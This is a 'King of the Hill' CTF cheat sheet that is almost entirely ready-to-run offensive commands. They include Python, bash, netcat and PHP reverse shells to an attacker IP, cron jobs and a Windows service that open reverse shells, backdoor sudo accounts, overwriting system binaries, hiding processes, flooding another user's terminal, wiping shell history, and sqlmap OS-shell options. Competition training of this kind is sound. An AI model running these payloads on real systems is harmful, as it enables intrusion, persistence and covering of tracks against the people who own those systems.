# KING OF THE HILL CHEAT SHEET

> Yazeed Ahmed | 06-11-2023

#################################################################
## Reverse Shells
```bash
#Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.47.29",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

pwncat-cs -lp 9999

#Bash
bash -i >& /dev/tcp/10.9.47.29/9999 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.47.29 9999 >/tmp/f

#PHP
php -r '$sock=fsockopen("10.9.47.29",9999);exec("/bin/sh -i <&3 >&3 2>&3");'
```

#################################################################
## Stablize Shell [TTY]
```bash
#Python
python3 -c "import pty;pty.spawn('/bin/bash')"
ctrl +z 
stty raw -echo;fg
export TERM=xterm

# OR S1REN
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c "import pty;pty.spawn('/bin/bash')"
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'
ctrl +z
stty raw -echo ; fg ; reset
stty columns 200 rows 200

# Bash
bash -p 
bash -l

# Is this rbash (Restricted Bash)? PT1
vi
:set shell=/bin/sh
:shell

vim
:set shell=/bin/sh
:shell

# Is perl present on the target machine?
perl -e 'exec "/bin/bash";'
perl -e 'exec "/bin/sh";'

# Is AWK present on the target machine?
awk 'BEGIN {system("/bin/bash -i")}'
awk 'BEGIN {system("/bin/sh -i")}'

# Is ed present on the target machines?
ed
!sh

# IRB Present on the target machine?
exec "/bin/sh"

# Is Nmap present on the target machine?
nmap --interactive
nmap> !sh
```

#################################################################
# Breaking out of not permitted
```bash
script -q /dev/null
script /dev/null -c /bin/bash
```

#################################################################
##  Checking for SUID Binary
```bash
find / -perm /4000 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find ~ -perm 4000 2>/dev/null
find ~ -u=s -type f 2>/dev/null
find / -perm /4000 2>/dev/null
getcap -r / 2>/dev/null
```
#################################################################
### Defence 
```bash
#Patching root access
chmod -s /usr/bin/pkexec
chmod u-s /usr/bin/pkexec
				
#Changing root/user password
echo -e "cyber2024\ncyber2024" | passwd root
echo -e "cyber2024\ncyber2024" | passwd user

# Protecting king flag
# LINUX
while [ 1 ]; do chattr -ia /root/king.txt 2>/dev/null; echo -n "CyberxploitHausa" >| /root/king.txt 2>/dev/null; chattr +ia /root/king.txt 2>/dev/null; done &

chattr -i /root/king.txt
while [[ $(cat /root/king.txt) != "[CyberxploitHausa]" ]]; do echo "[CyberxploitHausa]" >> /root/king.txt; done  &

# Mount root dir
lessecho CyberxploitHausa > /root/king.txt && dd if=/dev/zero of=/dev/shm/root_f bs=1000 count=100 && mkfs.ext3 /dev/shm/root_f && mkdir /dev/shm/sqashfs && mount -o loop /dev/shm/root_f /dev/shm/sqashfs/ && chmod -R 777 /dev/shm/sqashfs/ && lessecho CyberxploitHausa > /dev/shm/sqashfs/king.txt && mount -o ro,remount /dev/shm/sqashfs && mount -o bind /dev/shm/sqashfs/king.txt /root/king.txt && rm -rf /dev/shm/root_f 

# [undo the above]
umount -l /root/king.txt or umount -l /root

# Running root as cron job
CT=$(crontab -l)
CT=$CT$'\n10 * * * * echo CyberxploitHausa > /root/king.txt'
printf "$CT" | crontab -e

# WINDOWS
powershell -c "Invoke-WebRequest -Uri http://127.0.0.1:9999/king.txt -OutFile 'C:\Shares\King\king.txt'" echo  has king! %CyberxploitHausa% queried king.txt at %DATE% %TIME% >> C:\Shares\King\king.txt

@echo off
:x
attrib -a -s -r -i C:\Users\Administrator\king-server\king.txt&echo CyberxploitHausa > C:\Users\Administrator\king-server\king.txt&attrib +a +s +r +i C:\Users\Administrator\king-server\king.txt
goto x
```

#################################################################
# RDP Connection from kali to windows
```bash
xfreerdp /u:Administrator /p:GreedyGrabber1@ /v:10.10.161.241 /dynamic-resolution

rdesktop -u username 10.10.179.26
```
#################################################################
# Finding a flag
```bash
#LINUX
find / -name "*flag*" 2>/dev/null && find / -name "*user*" 2>/dev/null && find / -name flag 2>/dev/null && find / -name "*root*" 2>/dev/null
find / -name "*flag*" 2> /dev/null
find | grep -r flag
find / -type f -name pspy64 2>/dev/null
find / -type f -exec grep -lE "[a-fA-F0-9]{32}" {} + 2>/dev/null
--> Script
#!/bin/bash
read -p "Enter the string to search for: " search_string
find / -type f -exec grep -l "$search_string" {} + 2>/dev/null




# Windows
cd C:\
dir flag*.txt /s
```

#################################################################
## Prevent Rootkits
```bash
echo 1 > /proc/sys/kernel/modules_disabled && sysctl -w kernel.modules_disabled=1 && sysctl -w module.sig_enforce=1
```

#################################################################
## Prevent from writing to king.txt (Write: Modify: Execute: Delete)
	(F): Full control (equivalent to (M)+(W)+(E)+(D))
	(M): Modify (read, write, execute, and delete)
	(R): Read
	(W): Write
	(X): Execute
	(D): Delete
	- icacls king.txt /deny Everyone:(W)
	- icacls king.txt /deny Administrator:(F)

	- ## Removing the above
	- icacls king.txt /remove Everyone:(W)
	- icacls king.txt /remove Everyone:(M)
	- icacls king.txt /remove Administrator:(F)
    - icacls king.txt /remove Administrator:(M)

	- ## Granting Access to the above
	- icacls king.txt /grant Everyone:(W)
    - icacls king.txt /grant Administrator:(M)


#################################################################
## Creating Local Account with Root Privs
```bash
#LINUX
adduser --shell /bin/bash --home /var/ww/ nginxx  
usermod -aG sudo nginxx
```

#################################################################
## Creating a malicious service 
	sc create fsociety binpath= "C:\nc.exe 10.9.47.29 4444 -e cmd.exe" start= "auto" obj= "LocalSystem" password= ""


#################################################################
## Finding network connections and kill the process
```bash
netstat -ano | findstr :port
taskkill /pid 3208 /F
netstat -ltnup
pkill pid
kill -9 pid

## Hiding PID | PTS 
```bash
netstat -ltnup
mount -o bind /tmp /proc/PID
mount -o remount,rw,nosuid,nodev,noexec,relatime,hidepid=2 /proc
vi /etc/fstab
	- proc    /proc    proc    defaults,nosuid,nodev,noexec,relatime,hidepid=2     0     0
```

#################################################################
## Stoping Systemd PErsist
```bash
rm /etc/systemd/system/persistence.service && systemctl disable persistence.service && systemctl stop persistence
```

#################################################################
### Monitor a process and Log files

```bash
watch 'ps auxf | grep -E "sh|pts|tty|py|php|10\." | grep -vE "ps aux|grep|httpd|php-fpm|containerd|apt.systemd|sshd -D|apache2ctl -D|networkd-dispatcher|agetty |unattended-upgrade-shutdown|supervisord|startup.sh";' 
watch 'curl -m 5 -sL $VMIP:9999 | figlet'
lsof -i -P -n
lsattr
ps -eaf --forest
ps auxf
watch -n 1 "ps aux | grep suspicious_user"
tail -f /var/log/auth.log
tail -n 20 /var/log/syslog

# Follow all logs in real-time
sudo mkdir -p /var/log/journal
sudo systemctl restart systemd-journald

sudo journalctl -f

# Follow logs for SSH activity
sudo journalctl -u ssh -f

# Filter logs by priority (e.g., warnings or errors)
sudo journalctl -p warning -f
watch -n 1 "sudo journalctl -u cron --since '1 minute ago'"




```

#################################################################
```bash
cd //

# MOUNTing king file
echo CyberxploitHausa > /dev/shm/.../king.txt
mount --bind -r -o rw /dev/shm/.../king.txt /root/king.txt

mv /usr/bin/echo > echo.bak
mv /usr/bin/su > su.bak
echo 'CyberxploitHausa owned echo/mount now' > /usr/bin/echo
echo 'CyberxploitHausa owned su' > /usr/bin/su
find / |grep pty.py
nano /etc/services


tcpdump -i eth0 -c50 -nn > cap2.pcap 
cat /dev/urandom > /dev/pts/5 &

## Crontab
#!/bin/bash
echo "CyberxploitHausa" > /root/king.txt
sh -i >& /dev/tcp/10.9.47.29/9999 0>&1

crontab -e
* * * * * bash /dev/shm/.bak.sh
* * * * * root /bin/bash -c '/bin/sh -i >& /dev/tcp/10.9.47.29/9999 0>&1'

#!/bin/bash
echo CyberxploitHausa > /root/king.txt
sh -i >& /dev/tcp/10.9.47.29/9999 0>&1
* * * * * root /bin/bash -c '/bin/sh -i >& /dev/tcp/10.9.47.29/9999 0>&1'

# Hiding a process ID 
mount --bind /tmp /proc/221214
cd /proc; for pid in {1200..4000}; do echo -n $pid;cat /proc/$pid/cmdline; 2>/dev/null;done
cat /tmp/f | sh -i 2>&1 | nc 10.9.47.29 1337
python3 -c "import pty;pty.spawn('/bin/bash')"

find / -type f -exec -EH '^[0-9a-f]{32}$' {} \; 2>/dev/null
find / -type f -exec -EH '^[0-9a-f]{32}[0-9a-f]?' {} \; 2>/dev/null

```
#################################################################
# Web Fuzzing, Content Discovery, Directory busting
## GOBUSTER
```bash
# Nikto
nikto --host $URL -C all
# Gobuster Dir
gobuster dir -u $URL -w /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories.txt -k -t 30
# Gobuster Files
gobuster dir -u $URL -w /usr/share/SecLists/Discovery/Web-Content/raft-medium-files.txt -k -t 30
# Gobuster dns [subdomain]
gobuster dns -d someDomain.com -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 30

```
#################################################################
## WFUZZ
```bash
# Wfuzz files
export URL="https://example.com/FUZZ"
wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 "$URL"
# Wfuzz Directories
export URL="https://example.com/FUZZ/"
wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 "$URL" 

# AUTHENTICATED FUZZING:
export URL="https://example.com/FUZZ"
wfuzz -c -b "<SESSIONVARIABLE>=<SESSIONVALUE>" -z ffile,/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 "$URL"

# FUZZ DATA AND CHECK FOR PARAMETERS:
export URL="https://example.com/?parameter=FUZZ"
export URL="https://example.com/?FUZZ=data"
wfuzz -c -z file,/usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt "$URL"

# FUZZ Post Data
wfuzz -c -z file,/usr/share/wordlists/Fuzzing/command-injection.txt -d "postParameter=FUZZ" "$URL"

wfuzz -c -z file,users.txt -z file,pass.txt --sc 200 http://www.site.com/log.asp?user=FUZZ&pass=FUZ2Z

```

#################################################################
## FFUF
```bash
# Fuzz Host-header, match HTTP 200 responses.
ffuf -w hosts.txt -u https://example.org/ -H "Host: FUZZ" -mc 200

# Fuzz file paths from wordlist.txt
ffuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs 42 -c -v
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.156.219/FUZZ -mc 200 -fs 42 -c -v

ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-
medium.txt:FFUZ -u http://10.10.11.8:5000/FFUZ -ic -t 100
```

#################################################################
## SQLMAP
```bash
# [ + ] All Together for request.txt: NB: --level=amount of depth in url
sqlmap -r request.txt
sqlmap -r request.txt --threads=2
sqlmap -r request.txt --threads=2 --time-sec=10
sqlmap -r request.txt --threads=2 --time-sec=10 --level=2
sqlmap -r request.txt --threads=2 --time-sec=10 --level=2 --risk=2
sqlmap -r request.txt --threads=2 --time-sec=10 --level=2 --risk=2 --force-ssl --force-ssl
sqlmap -r request.txt --threads=2 --time-sec=10 --level=2 --risk=2 --force-ssl --dump
sqlmap -r request.txt --threads=2 --time-sec=10 --level=2 --risk=2 --force-ssl --dump --os-shell
sqlmap -r request.txt --threads=2 --time-sec=10 --level=2 --risk=2 --force-ssl --dump --os-pwn
# [ + ] On your URL Environment Variable :
sqlmap -u $URL --threads=2 --time-sec=10 --level=2 --risk=2 --technique=T --force-ssl
sqlmap -u $URL --threads=2 --time-sec=10 --level=2 --risk=2 --technique=B --force-ssl
sqlmap -u $URL --dbms=mysql --threads=2 --time-sec=10 --level=2 --risk=2 --technique=T --force-ssl

```

## RUSTSCAN
```
rustscan -a $IP

```

## Feroxbuster
```
feroxbuster --url $URL -no-recursion
feroxbuster -u $URL -t 100 -no-recursion -x html,php,txt
feroxbuster -u $URL -w /usr/share/wordlists/dirb/big.txt -t 100


history -c && rm ~/.bash_history
grep -oE '"(username|password)"\s*:\s*"[^"]*"'i
```
